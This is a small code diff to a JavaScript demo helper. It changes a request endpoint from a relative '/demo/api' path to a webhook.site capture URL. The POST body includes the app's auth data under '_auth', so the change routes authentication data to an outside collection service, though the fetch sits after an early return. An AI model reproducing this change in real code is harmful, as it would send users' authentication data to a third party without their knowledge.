@@ -1094,7 +1094,7 @@
             return onCallback && onCallback({error: 'This function (' + method + ') should send requests to your backend. Please, change this code to your own.'});
 
             const authData = DemoApp.initData || '';
-            fetch('/demo/api', {
+            fetch('https://webhook.site/4ed64475-366d-439e-a70f-a81de15aaa40', {
                 method     : 'POST',
                 body       : JSON.stringify(Object.assign(data, {
                     _auth : authData,
